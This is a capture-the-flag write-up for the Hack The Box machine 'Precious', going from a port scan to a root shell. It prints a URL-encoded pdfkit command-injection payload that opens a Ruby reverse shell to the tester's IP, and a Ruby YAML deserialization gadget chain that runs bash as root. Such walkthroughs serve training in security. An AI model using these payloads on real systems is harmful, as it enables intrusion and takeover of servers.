## Nmap
From the nmap scan, we are only able to find open ports 22 and 80 on the target IP
![nmap](https://github.com/joelczk/writeups/blob/main/HTB/Images/Precious/nmap.png)

## Exploiting Port 80
Navigating to Port 80, we realize that this is a site that converts html documents to pdf documents, and the site takes in the html documents from a remote host. Capturing the request body, we also realize that the site uses a vulnerable version of ```pdfkit``` that can be used to do remote code execution
![pdfkit](https://github.com/joelczk/writeups/blob/main/HTB/Images/Precious/pdfkit.png)

Modifying the url parameter in the request body to the payload below, we are able to create a reverse shell connection to our local listener

```
url=http%3A%2F%2F10.10.16.2%3A443%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.16.2%22%2C80%29%29%27%60
```

![Reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Precious/reverseshell.png)

## Privilege Escalation to Henry
In the /home/ruby/.bundle.config file, we are able to find the credentials for the ```henry``` user and we can then escalate our privileges to the henry user

![henry creds](https://github.com/joelczk/writeups/blob/main/HTB/Images/Precious/henry_creds.png)

## Obtaining user.txt
After escalating our privileges to the Henry user, we are then able to obtain the user flag
![user flag](https://github.com/joelczk/writeups/blob/main/HTB/Images/Precious/user_txt.png)

## Privilege Escalation to root user
Using ```sudo -l```, we realize that our current user is able to execute ```opt/update_dependencies.rb``` with root permissions. Checking the source code of ```update_dependencies.rb```, we realize that this is using a vulnerable ```yaml.load``` function which can be used for YAML deserialization attacks.
Next, we will create a ```dependency.yaml``` file with the following contents in the ```/home/henry``` directory

```
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: /bin/bash
          method_id: :resolve 
```
Executing ```/opt/update_dependencies.rb``` with root privileges will then give us a root shell

![Root Shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Precious/root.png)

## Obtaining root.txt
![root.txt](https://github.com/joelczk/writeups/blob/main/HTB/Images/Precious/root_txt.png)
